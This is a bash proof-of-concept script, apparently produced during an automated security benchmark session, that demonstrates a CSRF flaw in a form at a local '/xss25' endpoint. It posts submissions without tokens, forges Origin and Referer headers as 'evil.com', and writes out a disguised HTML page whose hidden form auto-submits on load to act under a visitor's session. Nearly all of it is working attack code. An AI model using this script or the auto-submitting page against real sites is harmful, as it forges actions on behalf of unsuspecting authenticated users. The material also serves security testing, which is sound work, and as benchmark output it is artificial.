#!/bin/bash
# POC: Demonstrates CSRF vulnerability in solution submission form at /xss25
# Target: ./repo
# Created: 2025-10-30T21:02:22.007Z
# Session: benchmark-XBEN-004-24-mhdwdru8

# CSRF Vulnerability POC for Solution Submission Form
# This demonstrates that the application accepts POST requests without CSRF tokens

TARGET="http://localhost:5001/xss25"
echo "==================================="
echo "CSRF Vulnerability POC"
echo "==================================="
echo ""

# Step 1: Verify form exists and has no CSRF protection
echo "[*] Step 1: Checking form HTML for CSRF tokens..."
FORM_HTML=$(curl -s "$TARGET")
echo "$FORM_HTML" | grep -A5 '<form' | head -10
echo ""

# Check for CSRF tokens
if echo "$FORM_HTML" | grep -qi "csrf\|_token\|authenticity"; then
    echo "[!] CSRF token found - vulnerability may not exist"
else
    echo "[+] No CSRF token found in form"
fi
echo ""

# Step 2: Submit POST request without CSRF token
echo "[*] Step 2: Submitting form without CSRF token..."
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "solution=CSRF_TEST_PAYLOAD")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE:/d')

echo "HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[+] SUCCESS: Form accepted without CSRF token!"
    echo "[+] Response preview:"
    echo "$BODY" | head -20
else
    echo "[-] Request failed with code $HTTP_CODE"
fi
echo ""

# Step 3: Create malicious HTML POC page
echo "[*] Step 3: Creating malicious HTML page..."
HTML_POC="pocs/csrf_attack_page.html"
cat > "$HTML_POC" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Welcome to our site!</h1>
    <p>Loading content...</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrfForm" method="POST" action="http://localhost:5001/xss25" style="display:none;">
        <input type="text" name="solution" value="MALICIOUS_PAYLOAD_VIA_CSRF" />
    </form>
    
    <script>
        // Auto-submit the form when page loads
        window.onload = function() {
            document.getElementById('csrfForm').submit();
        };
    </script>
</body>
</html>
EOF

echo "[+] Malicious HTML page created at: $HTML_POC"
echo "[+] An attacker could host this page and trick authenticated users into visiting it"
echo "[+] The form would auto-submit to the vulnerable endpoint using the victim's session"
echo ""

# Step 4: Test cross-origin request
echo "[*] Step 4: Testing cross-origin request simulation..."
CROSS_ORIGIN_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: http://evil.com" \
    -H "Referer: http://evil.com/attack.html" \
    -d "solution=CROSS_ORIGIN_ATTACK")

CROSS_HTTP_CODE=$(echo "$CROSS_ORIGIN_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)

echo "HTTP Status Code: $CROSS_HTTP_CODE"

if [ "$CROSS_HTTP_CODE" = "200" ] || [ "$CROSS_HTTP_CODE" = "302" ]; then
    echo "[+] VULNERABLE: Cross-origin POST accepted without validation!"
else
    echo "[-] Cross-origin POST rejected"
fi
echo ""

echo "==================================="
echo "VULNERABILITY CONFIRMED"
echo "==================================="
echo "The application accepts POST requests to /xss25 without:"
echo "  - CSRF tokens"
echo "  - Origin validation"
echo "  - Referer validation"
echo "  - Custom header requirements"
echo ""
echo "Impact: Attackers can submit forms on behalf of authenticated users"
echo "Malicious HTML POC available at: $HTML_POC"